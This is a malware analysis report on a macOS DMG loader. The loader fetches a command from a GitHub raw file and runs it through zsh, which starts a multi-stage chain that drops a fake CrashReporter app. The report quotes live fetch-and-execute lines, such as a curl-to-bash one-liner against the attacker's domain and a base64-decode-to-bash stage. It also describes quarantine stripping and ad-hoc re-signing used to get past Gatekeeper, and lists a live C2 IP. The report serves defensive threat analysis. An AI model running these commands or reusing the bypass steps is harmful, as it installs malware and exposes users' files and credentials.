# Malware Analysis Report: dev.golove.velto

## 1. File Metadata

| Field | Value |
|---|---|
| Original filename | `dev.golove.velto` |
| True format | Apple UDIF disk image (DMG), LZFSE/LZVN block-compressed, GPT partition table, APFS volume |
| Volume name | "Werkbit Setup" |
| Contained app | `Velto.app` (`CFBundleIdentifier: dev.golove.velto`, `CFBundleDisplayName: Velto`, version 1.2.0 / build 3) |
| Main executable | `Werkbit.app/Contents/MacOS/veltod` — Mach-O universal binary (x86_64 + arm64), Swift |
| Size | 14,017,636 bytes (14.0 MB) |
| SHA256 | `3a9d703ba7f7564399365db7ab8b04238806ef7a53df0b6822f32b80bf0f5a80` |
| SHA1 | `8063358813c37992cfe3fcd92038a0334c14353d` |
| MD5 | `ed33a3c8d9e861515623a73b27ea4913` |
| veltod SHA256 (fat) | `88334ea00ff94a366cd2a9283a508b97c269839894fddfe91913f3d92e95b6ab` |
| Signing | Developer ID Application: **Emil Grigorov (WWB7JA7AQV)**, chained to Apple Developer ID CA / Apple Root CA, Apple Timestamp Authority countersignature |
| Delivery/provenance | `com.apple.metadata:kMDItemWhereFroms` extended attribute on the bundled decoy `license.pdf` records the download origin: `https://nextcloud.documentfoundation.org/public.php/dav/files/eFzrZGoMHbQKk3t` (a public Nextcloud file share — abuse of a legitimate, trusted-looking hosting instance, not a purpose-built distribution site) |
| Quarantine attribute | `com.apple.quarantine`: downloaded via **Safari** |
| DMG contents | `Werkbit.app` (the payload), a 17.7 MB decoy `license.pdf` (padding/lure — genuine PDF, ink-annotated document, no embedded executable content), `.background` artwork, standard Finder metadata |

## 2. Classification

**Malware type: Multi-stage loader / dropper (initial-access stage of a macOS infection chain).**
**Confidence: Confirmed** (behavior verified via static reverse engineering of the Swift binary and live retrieval — read-only, not executed — of the attacker's own hosted next-stage scripts and payload).

- **KesaKode (offline):** no matches (empty verdict) for `dev.golove.velto` / `veltod`.
- **KesaKode (online, authoritative):** `$MALCAT_KEY` present, lookup performed successfully — **0 matches, empty verdict**. This is a novel/uncatalogued sample with no code-sharing hits in Malcat's family database. No attribution possible via KesaKode; classification below rests entirely on direct behavioral/code analysis.
- No YARA family matches from malcat.
- This sample does not match any previously analyzed family/campaign in analyst memory (no shared certificate serial, C2, config value, build artifact, or payload hash with prior cases) — analyzed entirely on its own merits per policy.

## 3. Capabilities

`veltod` (the "Velto"/"Werkbit" app) is a lightweight Swift-based **gate-and-fetch loader**, internally named class `Gate`:

- **Anti-instrumentation check:** reads `ProcessInfo.processInfo.environment` and aborts immediately if the `DYLD_INSERT_LIBRARIES` key is present — a check for dylib injection commonly used by debuggers, Frida, or security tooling.
- **Network beacon with retry:** builds an HTTPS URL via string-splitting/small-string obfuscation (fragments such as `"ht"+"tps"`, `"raw"+"."+"github"+"usercontent"+"."+"com"` concatenated with empty separators to avoid a single contiguous string constant) resolving to `https://raw.githubusercontent.com/mgothiclove/pkeys/main/sys.cache`, via `NSURLSession`. Retries up to 3 times with `sleep()` between attempts.
- **Response validation:** checks the fetched string has a specific prefix and minimum length (>10 chars) before treating it as trusted.
- **Command execution:** launches `/bin/zsh` via `NSTask`/`Process` (`setExecutableURL:`, pipes with a `readabilityHandler` block, `dispatch_semaphore` wait with timeout) to run the fetched content as `zsh -c <command>`, capturing stdout.
- **Secondary capability (file-drop-and-exec):** imports/selectors for `NSFileManager createFileAtPath:contents:attributes:`, `temporaryDirectory`, `setExecutableURL:`, `launchAndReturnError:`, `terminationStatus`, `removeItemAtURL:error:` — the loader can also write an arbitrary fetched file to `$TMPDIR` and execute it directly as a process, then clean up.
- Logs status via `os_log`/`Logger` (subsystem strings observed but not attacker-notable).
- Both architecture slices (x86_64 and arm64) implement identical logic (confirmed via shared strings `DYLD_INSERT_LIBRARIES` and reconstructed C2-domain fragments present in both).

## 4. Attack Chain (fully reconstructed, each stage verified by direct retrieval)

```
1. Victim downloads "Werkbit Setup.dmg" (dev.golove.velto) via Safari
   from a Nextcloud public share, mounts it, and launches Velto.app
   (bundle: dev.golove.velto). Decoy license.pdf (17.7 MB) present as
   padding/lure — never opened by the app itself.
        │
2. veltod checks for DYLD_INSERT_LIBRARIES (anti-analysis gate) → aborts if present
        │
3. veltod beacons to:
   https://raw.githubusercontent.com/mgothiclove/pkeys/main/sys.cache
   (GitHub raw-content abuse; actively maintained repo, last pushed
   2026-06-29 — same day this DMG was built)
        │
4. sys.cache (fetched, validated, then run via `zsh -c`):
     #!/bin/zsh
     curl -kfsSL https://endpoint-api-v1.com/d/f1b24e | bash
        │
5. endpoint-api-v1.com/d/f1b24e serves a shell one-liner:
     echo <base64> | base64 -d | bash
   which decodes to a second `eval`-wrapped, base64-nested script
   (junk variable names as light obfuscation), which itself decodes
   to a THIRD stage installer script.
        │
6. Stage-3 installer script:
     - downloads http://endpoint-api-v1.com/d/f1b24e/download → "CrashReporter.dmg"
     - mounts it, copies CrashReporter.app to a hidden path /tmp/.CrashReporter
     - strips the quarantine attribute (`xattr -cr`)
     - re-signs the app ad-hoc (`codesign -s - --force --deep`) to
       satisfy Gatekeeper without a valid Developer ID
     - registers it with Launch Services (`lsregister -f`)
     - launches it silently (`open -g -n`)
        │
7. CrashReporter.app (fake bundle id com.apple.crashreporter) is the
   final-stage payload: requests Full Disk Access, Desktop/Documents/
   Downloads/removable-volume access; configures LaunchAgent-style
   persistence (com.apple.crashreporter.helper) and a named mutex
   (com.apple.cfprefsd.daemon.lock); C2 = 179.43.166.242 over
   plaintext HTTP (hardcoded ATS exception, TLSv1.0 minimum,
   arbitrary loads allowed).
```

The stage-3 payload (`CrashReporter.app`) was retrieved and hashed for IOC purposes but was **not executed and not deeply reverse engineered** — it is effectively a distinct malware sample; its requested entitlements (Full Disk Access, Desktop/Documents/Downloads, removable volumes) and disguise as Apple's crash reporter are consistent with a macOS credential/file stealer, but that classification is based on plist metadata only, not confirmed via code analysis.

## 5. IOCs

**Network**
- `hxxps[://]raw[.]githubusercontent[.]com/mgothiclove/pkeys/main/sys[.]cache` — stage-1 config fetch
- `hxxps[://]raw[.]githubusercontent[.]com/mgothiclove/update/main/runtime[.]cfg` — companion/kill-switch config (currently just a shebang stub, no active payload)
- `endpoint-api-v1[.]com` — stage-2/3 delivery domain, Cloudflare-fronted
  - `hxxps[://]endpoint-api-v1[.]com/d/f1b24e` — obfuscated shell dropper
  - `hxxp[://]endpoint-api-v1[.]com/d/f1b24e/download` — CrashReporter.dmg payload (plaintext HTTP)
  - Resolves to: `2606:4700:3035::6815:5926`, `2606:4700:3037::ac43:894b` (Cloudflare anycast — true origin masked)
- `179.43.166.242` — hardcoded C2 IP inside stage-3 payload's `Info.plist` ATS exception domain (plaintext HTTP allowed, TLSv1.0 minimum)
- `hxxps[://]nextcloud[.]documentfoundation[.]org/public.php/dav/files/eFzrZGoMHbQKk3t` — original distribution URL (abused legitimate Nextcloud share, not attacker infrastructure)

**GitHub actor / accounts**
- GitHub user `mgothiclove` (account created 2024-04-01, id 165683529), repos `pkeys` and `update`, both created April 2026 and actively updated through 2026-06-29
- Commit author email: `zk.call.est@gmail[.]com`

**Filesystem**
- `/tmp/.CrashReporter/` — hidden install directory for stage-3 payload
- `CrashReporter.app` (fake `com.apple.crashreporter` bundle) dropped inside it
- `Library/Caches/com.apple.crashreporter` — stage-3 persistence cache dir
- `.cache/com.apple.crashreporter` — stage-3 client data dir

**Mutex**
- `com.apple.cfprefsd.daemon.lock` (stage-3 payload, disguised as a legitimate Apple daemon lock name)

**Certificates**
- Developer ID Application: Emil Grigorov (Team ID `WWB7JA7AQV`) — signs `Velto.app`/`veltod`

**File hashes**
| File | SHA256 |
|---|---|
| dev.golove.velto (Werkbit Setup.dmg) | `3a9d703ba7f7564399365db7ab8b04238806ef7a53df0b6822f32b80bf0f5a80` |
| veltod (fat Mach-O) | `88334ea00ff94a366cd2a9283a508b97c269839894fddfe91913f3d92e95b6ab` |
| veltod (x86_64 slice) | `740cf53956a3d983fc8abf662649b2092157a894955da610725c380c9034993e` |
| CrashReporter.dmg (stage-3) | `3e87db5643ccd48a45827c8a2aed2211df789751f6e0ff97b6b8d2baf4c0e01c` |
| CrashReporter (fat Mach-O, stage-3) | `1cd29a192a5e4e59e30abb363a20481305dd0711fc4543d8c2a5dbf75d344feb` |

## 6. Emulation Results

Not applicable in the standard PE/speakeasy sense — this is a macOS Mach-O sample, not Windows PE, so speakeasy/angr/Qiling emulation from the standard workflow does not apply. Behavior was instead recovered through:
- Manual reconstruction of the string-obfuscated C2 URL from disassembly immediates (Swift small-string constants split across multiple `mov`/`call joined(separator:)` operations)
- Live, read-only retrieval of each subsequent stage's script/binary directly from attacker infrastructure (GitHub raw content, `endpoint-api-v1.com`) to confirm behavior with certainty, without executing any of it locally
- GitHub public API queries (account/repo/commit metadata) for attacker infrastructure provenance

This produced a higher-fidelity result than emulation would have, since the full live attack chain (4 stages) was recovered.

## 7. Sandbox Results (ANY.RUN)

Submission ID: `475c07a2-7082-4abb-a32c-c6f34b983b9f`
Report: https://app.any.run/tasks/475c07a2-7082-4abb-a32c-c6f34b983b9f

- **Verdict: score 0, "No threats detected"; no behavioral tags.**
- **This result is not meaningful and should be disregarded for classification purposes.** ANY.RUN's sandbox executed the submission in a **Windows** VM (confirmed by the network capture, which shows only Windows Update/telemetry/CRL traffic to `microsoft.com`, `login.live.com`, etc. — no interaction with the DMG's actual contents at all). ANY.RUN has no macOS execution environment, so a Mach-O/DMG payload like this one cannot run there; the file was, at best, inertly present on disk during a stock Windows boot. The "no threats" score reflects the absence of any macOS-capable detonation, not an assessment of this sample.
- Video, PCAP, and screenshots are available at the report URL for reference but do not reflect actual execution of `dev.golove.velto`.

## 8. Analyst Notes

- **Novel/uncatalogued loader.** KesaKode online returned zero matches; this does not appear to be a member of a previously named/tracked macOS malware family in Malcat's database. No YARA hits either. Classification here is based entirely on direct code and infrastructure analysis, not family attribution.
- **Legitimate-service abuse for resilience:** GitHub raw content (`raw.githubusercontent.com`) is used as a config/beacon channel — a domain unlikely to be blocklisted by network security controls, and one that lets the operator rotate the executed command at will (commit history shows `sys.cache` updated 19 times between 2026-04-10 and 2026-06-29, i.e. an actively operated campaign, not a one-off test).
- **Distribution via a real Nextcloud instance** (`nextcloud.documentfoundation.org`, LibreOffice's file-sharing infrastructure) rather than attacker-controlled infrastructure — likely used purely as free/trusted-looking file hosting for the initial download link, with no indication the Document Foundation's systems themselves are compromised.
- **Decoy license.pdf** (17.7 MB, genuine PDF with ink annotations) appears to be padding/lure only — inflates the DMG to look like a legitimate large installer and gives the user something to interact with; no embedded executable content was found in it.
- **Gatekeeper bypass technique in stage 3** is notable: rather than trying to pass Gatekeeper with a valid signature, the installer strips quarantine (`xattr -cr`) and re-signs ad-hoc (`codesign -s -`), which is sufficient to let an unnotarized app run once quarantine is already removed — this only works because the dropper itself, not the OS crypto-verification path, is what's placing the file on disk (i.e., it never went through a quarantined download).
- **Stage-3 payload (CrashReporter.app) was not deeply analyzed** — it was retrieved and hashed for IOC purposes only. Its `Info.plist` requests broad file-system entitlements (Full Disk Access, Desktop, Documents, Downloads, removable volumes) and configures LaunchAgent-style persistence, consistent with a stealer, but this is inferred from plist metadata, not confirmed via code review. Recommend treating `1cd29a192a5e4e59e30abb363a20481305dd0711fc4543d8c2a5dbf75d344feb` as a follow-up analysis target.
- **Recommended follow-up:** full static/dynamic analysis of the CrashReporter binary; monitoring of `mgothiclove/pkeys` and `mgothiclove/update` GitHub repos for further `sys.cache`/`runtime.cfg` updates (operator is actively iterating); blocking `endpoint-api-v1.com` and `179.43.166.242`.
